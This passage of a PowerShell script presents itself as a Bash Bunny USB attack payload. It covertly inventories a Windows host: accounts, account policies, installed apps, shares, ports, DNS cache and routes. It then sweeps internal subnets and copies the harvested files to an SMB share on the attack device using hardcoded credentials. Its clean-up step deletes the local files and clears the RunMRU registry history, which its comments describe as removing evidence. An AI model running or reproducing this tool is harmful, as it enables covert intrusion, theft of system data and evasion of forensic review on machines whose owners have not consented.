						    Write-Verbose "$($MyInvocation.MyCommand.Name) - Waiting for message return"
						    $receivebytes = $UdpClient.Receive([ref]$remoteendpoint)
						    [string]$returndata = $a.GetString($receivebytes)
						    If ($returndata) {
							    Write-Verbose "$($MyInvocation.MyCommand.Name) - '$Computer' passed port test on port '$Protocol</code>:$Portx'"
							    $Output.Result = $true
						    }
					    } catch {
						    Write-Verbose "$($MyInvocation.MyCommand.Name) - '$Computer' failed port test on port '$Protocol`:$Portx' with error '$($_.Exception.Message)'"
						    $Output.Result = $false
					    }
					    $UdpClient.Close()
					    $UdpClient.Dispose()
				    }
				    [pscustomobject]$Output
			    }
		    }
	    }
    }

    function GetNetDevices
    {
        <#
	    .SYNOPSIS
		    This function scans the local network.
	    .DESCRIPTION
		    Uses test-netconnection to find open ports.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE	
        #>

        PARAM (
                $IPs2Disc
              )

        foreach($IP in $IPs2Disc.Name)
        {
	        for($i=1;$i-lt255;$i++)
	        {
                $DIP = $IP + $i
                #write-host $DIP
		        $P=test-connection -computername $DIP -quiet -count 1
		        if($P)
		        {
			        Disc_IP -ipaddress $DIP -TRDNS NO -S2FILE FILE
		        }
	        }
        }
    }

    function GetDNSSrvs
    {
        <#
	    .SYNOPSIS
		    This function grabs the DNS servers.
	    .DESCRIPTION
		    Finds DNS servers.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
	    #>
        #Write-Output "`nTrace Route to DNS Servers" | out-file -append $global:CurFName
        $DiscIPs = @()
        $TRDNS = "Yes"
        $S2File = "FILE"
        $DNSServers = @()
        $InternetDNS = 0

        $TIS=Get-NetIPAddress | Select IPAddress, AddressFamily, InterfaceIndex | where { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "172.16.64.*" -and $_.IPAddress -ne "127.0.0.1"}

        foreach($IP in $TIS)
        {
	        $DNSServers = Get-DnsClientServerAddress | Select ServerAddresses, InterfaceIndex, AddressFamily | Where { $_.InterfaceIndex -eq $IP.InterfaceIndex -and $_.AddressFamily -eq $IP.AddressFamily}
            foreach($DNSIP in $DNSServers.ServerAddresses)
            {
                $NetLoc = IPType($DNSIP)

                if($NetLoc -ne "Local")
                {
                    $InternetDNS++
                }
                if($InternetDNS -le 1 -or $NetLoc -eq "Local")
                {
                    $InternetCheck = $False
                    foreach($FIP in $DiscIPs)
                    {
                        if($FIP -eq $DNSIP)
                        {
                            $InternetCheck = $True
                        }
                    }
                    if($InternetCheck -eq $False)
                    {
                        $TempVar = [ordered]@{
                                                IPAddress = $DNSIP
                                             }
                        $PSObject = new-object -TypeName PSObject -Property $TempVar
                        $DiscIPs += $PSObject
                    }
                }
            }
        }
        Return $DiscIPs
    }

    function GetArp
    {
        $FinalTR = @()
        $ArpTable = arp -a |% { $_.ToString().Trim().Split(" ")}

        foreach($Arp in $ArpTable)
        {
                $charCount = ($Arp.ToCharArray() | Where-Object {$_ -eq '.'} | Measure-Object).Count
                if($charCount -eq 3)
                {
                    $NetLoc = IPType($Arp)
                    if($NetLoc -eq "Local")
                    {
                        $TempVar = [ordered]@{
                                            IPAddress = $Arp
                                            #DNSName = $ResolveEachHop
                                         }
                        $PSObject = new-object -TypeName PSObject -Property $TempVar
                        $FinalTR += $PSObject
                    }
                }
            
        }
        Return $FinalTR
    }

    Function DNSNames
    {
        $Domains = @()
        $FinalTR = @()

        $Domains = Get-DnsClientGlobalSetting | Select SuffixSearchList

        foreach($Dom in $Domains.SuffixSearchList)
        {
            $Dname = $Dom.split(';')
            foreach($item in $Dname)
            {
                $DomRes = Resolve-DnsName $item -ErrorAction Ignore | Select IPAddress
                
                foreach($IP in $DomRes)
                {
                    $TempVar = [ordered]@{
                                                IPAddress = $IP.IPAddress
                                                #DNSName = $ResolveEachHop
                                             }
                            $PSObject = new-object -TypeName PSObject -Property $TempVar
                            $FinalTR += $PSObject
                }
            }
        }
        return $FinalTR
    }

    function GetDNSCacheIPs
    {
        $FinalTR = @()
        $DNSCache = @()

        $DNSCache = Get-DnsClientCache | Select Entry, Data

        foreach($Entry in $DNSCache.Data)
        {
            if($Entry.count -ne 0 -and [ipaddress]::TryParse($Entry,[ref][ipaddress]::Loopback))
            {
                $charCount = ($Entry.ToCharArray() | Where-Object {$_ -eq '.'} | Measure-Object).Count
                if($charCount -eq 3)
                {
                    $NetLoc = IPType($Entry)
                    if($NetLoc -eq "Local")
                    {
                        $TempVar = [ordered]@{
                                            IPAddress = $Entry
                                            #DNSName = $ResolveEachHop
                                         }
                        $PSObject = new-object -TypeName PSObject -Property $TempVar
                        $FinalTR += $PSObject
                    }
                }
            }
        }

        foreach($Entry in $DNSCache.Entry)
        {
            $SplitCache = $Entry.split('.')
            $IP = $SplitCache[3]+"."+$SplitCache[2]+"."+$SplitCache[1]+"."+$SplitCache[0]

            if($IP.count -ne 0 -and [ipaddress]::TryParse($IP,[ref][ipaddress]::Loopback))
            {
                $charCount = ($IP.ToCharArray() | Where-Object {$_ -eq '.'} | Measure-Object).Count
                if($charCount -eq 3)
                {
                    $NetLoc = IPType($IP)
                    if($NetLoc -eq "Local")
                    {
                        $TempVar = [ordered]@{
                                            IPAddress = $IP
                                            #DNSName = $ResolveEachHop
                                         }
                        $PSObject = new-object -TypeName PSObject -Property $TempVar
                        $FinalTR += $PSObject
                    }
                }
            }
        }
        Return $FinalTR
    }

    function GetNetConnections
    {
        $FinalTR = @()
        $NetConns = Get-WmiObject Win32_NetworkConnection

        foreach($Conn in $NetConns)
        {
            $ConnSplit = $NetConns.RemoteName.split('\')
            foreach($item in $ConnSplit)
            {
                $charCount = ($item.ToCharArray() | Where-Object {$_ -eq '.'} | Measure-Object).Count
            
                if($charCount -eq 3)
                {
                    $TempVar = [ordered]@{
                                            IPAddress = $item
                                            #DNSName = $ResolveEachHop
                                         }
                        $PSObject = new-object -TypeName PSObject -Property $TempVar
                        $FinalTR += $PSObject
                }
            }
        }
        Return $FinalTR
    }

    function GetActivePorts
    {
        $ActivePorts = @()

        get-NetTCPConnection | where {$_.State -ne "Listen" -And $_.LocalAddress -like "*.*.*.*"} | Sort LocalPort | foreach-object {
                                    $Remote_IP_Addr = $_.RemoteAddress
                    
                                $NetLoc = IPType($Remote_IP_Addr)

                                if($NetLoc -eq "Local")
                                {
                                    $TempVar = [ordered]@{
                                        IPAddress = $Remote_IP_Addr
                                    }
                                }
                     $PSObject = new-object -TypeName PSObject -Property $TempVar
                     $ActivePorts += $PSObject
                     }
        return $ActivePorts
    }

    function GetRoutePrint
    {
        $FinalTR = @()
        $RouteTable = get-netroute

        foreach($Route in $RouteTable.DestinationPrefix)
        {
            $IPAddr = $Route.Split('/')[0]
            $charCount = ($IPAddr.ToCharArray() | Where-Object {$_ -eq '.'} | Measure-Object).Count
            if($charCount -eq 3)
            {
                $NetLoc = IPType($IPAddr)
                if($NetLoc -eq "Local")
                {
                    $TempVar = [ordered]@{
                                          IPAddress = $IPAddr
                                           #DNSName = $ResolveEachHop
                                         }
                    $PSObject = new-object -TypeName PSObject -Property $TempVar
                    $FinalTR += $PSObject
                }
            }
        }

        foreach($IPAddr in $RouteTable.NextHop)
        {
            $charCount = ($IPAddr.ToCharArray() | Where-Object {$_ -eq '.'} | Measure-Object).Count
            if($charCount -eq 3)
            {
                $NetLoc = IPType($IPAddr)
                if($NetLoc -eq "Local")
                {
                    $TempVar = [ordered]@{
                                          IPAddress = $IPAddr
                                           #DNSName = $ResolveEachHop
                                         }
                    $PSObject = new-object -TypeName PSObject -Property $TempVar
                    $FinalTR += $PSObject
                }
            }
        }
        Return $FinalTR
    }

    function GetOwnedIPs
    {
        $FinalTR = @()
        foreach ($IP in $global:OwnedIPSpace)
        {
            $TempVar = [ordered]@{
                                  IPAddress = $IP
                                  #DNSName = $ResolveEachHop
                                 }
            $PSObject = new-object -TypeName PSObject -Property $TempVar
            $FinalTR += $PSObject
        }
        return $FinalTR
    }

    Function NetSpider
    {
        PARAM (
                $FoundIPs
              )
        $FinalTR = @()
        $IPMap = @()
        $PrevDNS = "254.254.254."
        #$LocalIP = get-netipaddress | Select IPAddress, AddressFamily | where { $_.AddressFamily -eq "IPv4" -and $_.IPaddress -notlike "169*" -and $_.IPAddress -ne "127.0.0.1"}
        #$SplitLocalIP = $LocalIP.IPAddress.split('.')
        #$LocalSubnet = $SplitLocalIP[0]+"."+$SplitLocalIP[1]+"."+$SplitLocalIP[2]+"."

        foreach($DNS in $FoundIPs.Name)
        {
            $SplitIP = $DNS.split('.')
            $CurDNS = $SplitIP[0]+"."+$SplitIP[1]+"."+$SplitIP[2]+"."
            
            if($CurDNS -ne $PrevDNS)
            {
                Write-Output "Trace Route to $DNS" | out-file -append $global:CurFName
                $TraceRoute = @()
                $TraceRoute = test-netconnection -computername $DNS -TraceRoute -Hops 15 -warningaction SilentlyContinue

                $HopCount = -1

                foreach ($item in $TraceRoute.TraceRoute)
                {
                    $NetLoc = IPType($item)

                    $HopCount++

                    if($NetLoc -eq "Local")
                    {
                        #write-host $IPMap.count

                        if($IPMap.count -eq 0)
                        {
                            $TempVar = [ordered]@{
                                IPNetMap = $item
                                IPHop = $HopCount
                            }
                            $PSObject = new-object -TypeName PSObject -Property $TempVar
                            $IPMap += $PSObject
                        }
                        else
                        {
                            $MapFound = $False

                            foreach($IP in $IPMap.IPNetMap)
                            {
                                if($IP -eq $item)
                                {
                                    $MapFound = $True
                                }
                            }

                            if(!$MapFound)
                            {
                                $TempVar = [ordered]@{
                                    IPNetMap = $item
                                    IPHop = $HopCount
                                }
                                $PSObject = new-object -TypeName PSObject -Property $TempVar
                                $IPMap += $PSObject
                            }
                        }

                        #write-host $IPMap
                    }

                    $SplitTR = $item.split('.')
                    $TRNet = $SplitTR[0]+"."+$SplitTR[1]+"."+$SplitTR[2]+"."

                    if($item -ne '0.0.0.0')
                    {
                        $ResolveEachHop = Resolve-DnsName $item -ErrorAction Ignore |Select-Object -exp NameHost
                        
                        if ($ResolveEachHop.Length -eq 0)
                        {
                            $ResolveEachHop = $item
                        }
                        if($NetLoc -eq "Local")
                        {
                            $TempVar = [ordered]@{
                                IPNetwork = $TRNet
                                #DNSName = $ResolveEachHop
                            }
                            $PSObject = new-object -TypeName PSObject -Property $TempVar
                            $FinalTR += $PSObject
                        }
                    }
                    Write-Output "  > $item ==> $ResolveEachHop" | out-file -append $global:CurFName
                }

                $NetLoc = IPType($DNS)

                if($NetLoc -eq "Local")
                {
                    $TempVar = [ordered]@{
                        IPNetwork = $CurDNS
                        #DNSName = $ResolveEachHop
                    }
                    $PSObject = new-object -TypeName PSObject -Property $TempVar
                    $FinalTR += $PSObject
                }
                $PrevDNS = $CurDNS
            }
        }
        $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"MAP.txt"
        #$SortedIPMap = $IPMap | Select * | Sort -property IPHop, IPNetMap
        $SortedIPMap = $IPMap
        Write-output $IPMap | out-file -append $global:CurFName
        return $FinalTR
    }

    function PS_NetStat
    {
        <#
	    .SYNOPSIS
		    This function lists all available ports.
	    .DESCRIPTION
		    Performs a NetStat command.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE	
        #>

        param
        (
            [string]$PortOption
        )

        Write-Output "`nPS Netstat" | out-file -append $global:CurFName

        $PS_NetStat = @()

        if ($PortOption -eq "Listen")
        {
            get-NetTCPConnection | where {$_.State -eq "Listen"} | Sort LocalPort | foreach-object {
                    $PortState = $_.State
                    $Local_IP_Addr = $_.LocalAddress
                    $Local_Port = $_.LocalPort
                    $Proc_ID = $_.OwningProcess
                    $ProcessID = Get-Process -ID $Proc_ID
                    $SearchCritI = "ImageName eq svchost.exe"
                    $SearchCritP = "PID eq $($Proc_ID)"
                    $TempString = Tasklist /nh /svc /fi $SearchCritI /fi $SearchCritP
                    $SrvNameArray = $TempString.split('',3,[System.StringSplitOptions]::RemoveEmptyEntries).Trim()
                    if ($SrvNameArray[0] -eq "svchost.exe")
                    {
                        $SrvName = $SrvNameArray[2]
                    }
                    else
                    {
                        $SrvName = ""
                    }

                    $TempVar = [ordered]@{
                        Port_State = $PortState
                        Local_IP_Address = $Local_IP_Addr
                        Local_Port = $Local_Port
                        Process_ID = $Proc_ID
                        Process_Name = $ProcessID.Name
                        Service_Name = $SrvName
                     }
                     $PSObject = new-object -TypeName PSObject -Property $TempVar
                     $PS_NetStat += $PSObject
            }
        }
        else
        {
            get-NetTCPConnection | where {$_.State -ne "Listen" -And $_.State -ne "TimeWait"} | Sort LocalPort | foreach-object {
                    $PortState = $_.State
                    $Local_IP_Addr = $_.LocalAddress
                    $Local_Port = $_.LocalPort
                    $Proc_ID = $_.OwningProcess
                    $ProcessID = Get-Process -ID $Proc_ID
                    $SearchCritI = "ImageName eq svchost.exe"
                    $SearchCritP = "PID eq $($Proc_ID)"
                    $TempString = Tasklist /nh /svc /fi $SearchCritI /fi $SearchCritP
                    $SrvNameArray = $TempString.split('',3,[System.StringSplitOptions]::RemoveEmptyEntries).Trim()
                    if ($SrvNameArray[0] -eq "svchost.exe")
                    {
                        $SrvName = $SrvNameArray[2]
                    }
                    else
                    {
                        $SrvName = ""
                    }

                    $TempVar = [ordered]@{
                        Port_State = $PortState
                        Local_IP_Address = $Local_IP_Addr
                        Local_Port = $Local_Port
                        Process_ID = $Proc_ID
                        Process_Name = $ProcessID.Name
                        Service_Name = $SrvName
                     }
                     $PSObject = new-object -TypeName PSObject -Property $TempVar
                     $PS_NetStat += $PSObject
             }
        }
        Write-Output $PS_NetStat | FT | out-file -append $global:CurFName
        Write-Output "`nEnd op PS Netstat" | out-file -append $global:CurFName
    }

    function ListeningPorts
    {
        <#
	    .SYNOPSIS
		    This function lists all listening ports.
	    .DESCRIPTION
		    Finds all listening ports.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE	
        #>

        Write-Output "`nListening Ports" | out-file -append $global:CurFName
        
        $ListenPorts = @()

        get-NetTCPConnection | where {$_.State -eq "Listen" -And $_.LocalAddress -like "*.*.*.*"} | Sort LocalPort | foreach-object {
                                    $PortState = $_.State
                                    $Local_IP_Addr = $_.LocalAddress
                                    $Local_Port = $_.LocalPort
                                    $VulnPort = $False
                                    if ($global:Most_Common_Atkd_Ports -contains $_.LocalPort)
                                    {
                                        $VulnPort = $True
                                    }
                                    $Proc_ID = $_.OwningProcess
                                    $ProcessID = Get-Process -ID $Proc_ID
                                    $SearchCritI = "ImageName eq svchost.exe"
                                    $SearchCritP = "PID eq $($Proc_ID)"
                                    $TempString = Tasklist /nh /svc /fi $SearchCritI /fi $SearchCritP
                                    $SrvNameArray = $TempString.split('',3,[System.StringSplitOptions]::RemoveEmptyEntries).Trim()
                                    if ($SrvNameArray[0] -eq "svchost.exe")
                                    {
                                        $SrvName = $SrvNameArray[2]
                                    }
                                    else
                                    {
                                        $SrvName = ""
                                    }
                                    $VulnSrv = $False
                                    if ($global:Most_Common_Atkd_Services -contains $SrvName)
                                    {
                                        $VulnSrv = $True
                                    }

                                    $TempVar = [ordered]@{
                                        State = $PortState
                                        #Local_IP_Address = $Local_IP_Addr
                                        Local_Port = $Local_Port
                                        #Freq_Atkd_Port = $VulnPort
                                        Process_ID = $Proc_ID
                                        Process_Name = $ProcessID.Name
                                        Service_Name = $SrvName
                                        #Freq_Atkd_Service = $VulnSrv
                                        #Audit_Finding = "System is correctly configured."
                                        #Recommendation = ""
                                    }
                     $PSObject = new-object -TypeName PSObject -Property $TempVar
                     $ListenPorts += $PSObject
                     }
                     Write-Output $ListenPorts | FT | out-file -append $global:CurFName
                     Write-Output "`nEnd of Listening Ports" | out-file -append $global:CurFName
    }

    function ActivePorts
    {
        <#
	    .SYNOPSIS
		    This function lists all active ports.
	    .DESCRIPTION
		    Finds all active ports.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE	
        #>

        Write-Output "`nActive Ports" | out-file -append $global:CurFName
        
        $ActivePorts = @()

        get-NetTCPConnection | where {$_.State -ne "Listen" -And $_.LocalAddress -like "*.*.*.*"} | Sort LocalPort | foreach-object {
                                    $PortState = $_.State
                                    $Remote_IP_Addr = $_.RemoteAddress
                                    $Local_IP_Addr = $_.LocalAddress
                                    $Local_Port = $_.LocalPort
                                    $VulnPort = $False
                                    if ($global:Most_Common_Atkd_Ports -contains $_.LocalPort)
                                    {
                                        $VulnPort = $True
                                    }
                                    $Proc_ID = $_.OwningProcess
                                    $ProcessID = Get-Process -ID $Proc_ID
                                    $SearchCritI = "ImageName eq svchost.exe"
                                    $SearchCritP = "PID eq $($Proc_ID)"
                                    $TempString = Tasklist /nh /svc /fi $SearchCritI /fi $SearchCritP
                                    $SrvNameArray = $TempString.split('',3,[System.StringSplitOptions]::RemoveEmptyEntries).Trim()
                                    if ($SrvNameArray[0] -eq "svchost.exe")
                                    {
                                        $SrvName = $SrvNameArray[2]
                                    }
                                    else
                                    {
                                        $SrvName = ""
                                    }
                                    $VulnSrv = $False
                                    if ($global:Most_Common_Atkd_Services -contains $SrvName)
                                    {
                                        $VulnSrv = $True
                                    }

                                    $TempVar = [ordered]@{
                                        State = $PortState
                                        Remote_IP_Address = $Remote_IP_Addr
                                        #Local_IP_Address = $Local_IP_Addr
                                        Local_Port = $Local_Port
                                        #Freq_Atkd_Port = $VulnPort
                                        Process_ID = $Proc_ID
                                        Process_Name = $ProcessID.Name
                                        Service_Name = $SrvName
                                        #Freq_Atkd_Service = $VulnSrv
                                        #Audit_Finding = "System is correctly configured."
                                        #Recommendation = ""
                                    }
                     $PSObject = new-object -TypeName PSObject -Property $TempVar
                     $ActivePorts += $PSObject
                     }
                     Write-Output $ActivePorts | FT | out-file -append $global:CurFName
                     Write-Output "`nEnd of Active Ports" | out-file -append $global:CurFName
    }

    function CreateNetMap
    {
        <#
	    .SYNOPSIS
		    This function maps the G drive to the SMB server on the Bash Bunny.
	    .DESCRIPTION
		    Network mapping using SMB.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE	
        #>

        New-SmbMapping -LocalPath 'G:' -RemotePath '\\172.16.64.1\sw2_shr' -Username 'bash' -Password 'bunny'
        start-sleep 5
    }

    function CopyFiles
    {
        <#
	    .SYNOPSIS
		    This function copies file to Bash Bunny.
	    .DESCRIPTION
		    Copy files.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE	
        #>

        $CopyFileName = "G:\"
        $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"*.txt"
        Copy-Item -Path $global:CurFName -Destination $CopyFileName
        start-sleep 60
        Remove-Item -Path $global:CurFName
    }

    function CleanUp
    {
        <#
	    .SYNOPSIS
		    This function remove evidence of the file and powershell script.
	    .DESCRIPTION
		    Remove all tracks.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE	
        #>

        if($global:CreatedTemp)
        {
            Remove-Item 'C:\Temp'
        }

        net use g: /d

        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

        if($global:PS_ScriptLogging)
        {
            Set-ItemProperty 'HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockInvocationLogging -value 1
        }
    }

# *** MAIN PROGRAM ***

    <#
    Setup Variables
        $global:CurFName - File name to write all the data to.
        $CreatedTemp     - Boolean indicating when the Temp directory was created
                           by this code or not.
    #>

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"SI.txt"

    $global:Most_Common_Atkd_Ports = @('20','21','22','23','25','42','53','67','68','69','79','80','88','110','111','119','123','135','137','138','139','143','161','162','389','443','445','514','636','873','993','995','1433','1434','3306','3389','5800','5900','5985')
    $global:Most_Common_Atkd_Services = @('FTP','SSH','Telnet','SMTP','DNS','HTTP','POP3','RPC','NetBIOS','ms-sql','TFTP','Finger','Kerberos','SUNRPC','NB Session','NB Name','SNMP','SNMP Trap','LDAP','SSL','HTTPS','SMB','CIFS','Syslog','WINS','DHCP','NNTP','NTP','NB Datagram','IMAP','LDAPS','IMAPS','MySQL','RDP','VNC','WinRM','TermService')
    $global:WindowsServices = @('AJRouter','ALG','bthserv','CertPropSvc','DiagTrack','DsmSvc','DPS','WdiServiceHost','WdiSystemHost','MapsBroker','HvHost','vmickvpexchange','vmicguestinterface','vmicshutdown','vmicheartbeat','vmcompute','vmicvmsession','vmicrdv','vmictimesync','vmms','vmicvss','SharedAccess','iphlpsvc','wlidsvc','MSiSCSI','NcaSvc','PhoneSvc','QWAVE','RmSvc','RpcLocator','SCardSvr','ScDeviceEnum','SCPolicySvc','SNMPTRAP','TapiSrv','TabletInputService','WalletService','WbioSrvc','FrameServer','WerSvc','stisvc','icssvc','XboxGipSvc','XblAuthManager','XblGameSave','XboxNetApiSvc')

    $global:PS_ScriptLogging = $False

    $global:CreatedTemp = DirCheck

    #$global:OwnedIPSpace = @('199.96.16.1','199.96.17.1','199.96.18.1','199.96.19.1','199.96.20.1','199.96.21.1','199.96.22.1','199.96.23.1','199.96.24.1','199.96.25.1','199.96.26.1','199.96.27.1','206.107.235.1')
    $global:OwnedIPSpace = @('199.96.16.1')
    $FoundDNS = @()
    $FoundNetCon = @()
    $FoundDomains = @()
    $FoundArp = @()
    $FoundActPrts = @()
    $FoundRoutes = @()
    $Found = @()
    $FinalList = @()
    $DiscoveryNets = @()

    $StartDate = Get-Date

    Write-Output "*************************************************************************************" | out-file -append $global:CurFName
    Write-Output "Discovery Start Time:"$StartDate  | out-file -append $global:CurFName
    Write-Output "*************************************************************************************" | out-file -append $global:CurFName
    
    $global:OverallTimer = [System.Diagnostics.Stopwatch]::StartNew()

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"SI.txt"
    GetSysInfo

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"NS.txt"
    GetNetShares

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"IA.txt"
    GetInstalledApps
    
    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"HF.txt"
    GetHostsFile

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"AP.txt"
    GetAccountPolicies

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"LA.txt"
    GetLocalAccounts

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"NC.txt"
    GetNetConfig

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"DC.txt"
    GetDNSCache

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"PSNS.txt"
    PS_NetStat

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"LP.txt"
    ListeningPorts

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"AP.txt"
    ActivePorts

    $FoundDNS = GetDNSSrvs
    if($FoundDNS.IPAddress.length -gt 0)
    {
        $Found = $Found + $FoundDNS
    }
    
    #$FoundDNS

    $FoundNetCon = GetNetConnections
    if($FoundNetCon.IPAddress.length -gt 0)
    {
        $Found = $Found + $FoundNetCon
    }

    #$FoundNetCon

    $FoundDomains = DNSNames
    if($FoundDomains.IPAddress.length -gt 0)
    {
        $Found = $Found + $FoundDomains
    }

    #$FoundDomains

    $FoundDNSCache = GetDNSCacheIPs
    if($FoundCache.IPAddress.length -gt 0)
    {
        $Found = $Found + $FoundDNSCache
    }

    #$FoundDNSCache

    $FoundArp = GetArp
    if($FoundArp.IPAddress.length -gt 0)
    {
        $Found = $Found + $FoundArp
    }

    #$FoundArp

    $FoundActPrts = GetActivePorts
    if($FoundActPrts.IPAddress.length -gt 0)
    {
        $Found = $Found + $FoundActPrts
    }

    #$FoundActPrts

    $FoundRoutes = GetActivePorts
    if($FoundRoutes.IPAddress.length -gt 0)
    {
        $Found = $Found + $FoundRoutes
    }

    #$FoundRoutes

    $OIPSpace = GetOwnedIPs
    if($OIPSpace.IPAddress.length -gt 0)
    {
        $Found = $Found + $OIPSpace
    }

    #$OIPSpace

    $FinalList = $Found | where { $_.IPAddress.count -gt 0 -and $_.IPAddress -ne "127.0.0.1" } | Group -property IPAddress | Sort Name

    #$FinalList

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"TR.txt"

    $DiscNets = NetSpider($FinalList)
    $DiscoveryNets = $DiscNets | where { $_.IPNetwork.count -gt 0 } | Group -property IPNetwork

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"DN.txt"

    Write-Output "`nDiscovered Networks" | out-file -append $global:CurFName
    write-output $DiscoveryNets | Select Name | out-file -append $global:CurFName
    Write-Output "`nEnd of Discovered Networks" | out-file -append $global:CurFName

    $global:CurFName = "c:\temp\"+$ENV:COMPUTERNAME+"DIP.txt"

    GetNetDevices($DiscoveryNets)

    $global:OverallTimer.Stop()
    $LoadOverallTime = $global:OverallTimer.Elapsed
    $ElapsedOverallTime = "{0:HH:mm:ss}" -f ([datetime]$LoadOverallTime.Ticks)
    Write-Output "*************************************************************************************" | out-file -append $global:CurFName
    Write-Output "Discovery Time:"$ElapsedOverallTime  | out-file -append $global:CurFName
    Write-Output "*************************************************************************************" | out-file -append $global:CurFName

    CreateNetMap
    CopyFiles

    New-Item -Path G:\ -Name 'SC' -Value 'SC'
    start-sleep 5

    CleanUp